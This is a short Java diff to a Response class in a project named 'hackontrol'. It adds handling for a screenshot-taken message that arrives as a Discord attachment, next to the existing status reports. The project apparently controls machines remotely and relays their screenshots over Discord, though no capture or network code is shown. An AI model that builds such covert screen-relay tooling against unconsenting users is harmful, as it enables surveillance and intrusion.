@@ -1,9 +1,13 @@
 package com.khopan.hackontrol;
 
+import java.util.List;
+
 import com.fasterxml.jackson.databind.JsonNode;
 import com.fasterxml.jackson.databind.ObjectMapper;
 import com.fasterxml.jackson.databind.node.ObjectNode;
 import com.khopan.hackontrol.network.ResponseMode;
+
+import net.dv8tion.jda.api.entities.Message.Attachment;
 
 public class Response {
 	private final Hackontrol hackontrol;
@@ -14,7 +18,7 @@ public class Response {
 		this.mapper = new ObjectMapper();
 	}
 
-	public void parse(String response) {
+	public void parse(String response, List<Attachment> attachmentList) {
 		if(response == null) {
 			return;
 		}
@@ -58,6 +62,13 @@ public class Response {
 		switch(mode) {
 		case ResponseMode.STATUS_REPORT:
 			this.hackontrol.statusReport(identifier, objectNode);
+			break;
+		case ResponseMode.SCREENSHOT_TAKEN:
+			if(attachmentList.isEmpty()) {
+				return;
+			}
+
+			this.hackontrol.screenshotTaken(identifier, attachmentList.get(0));
 			break;
 		}
 	}
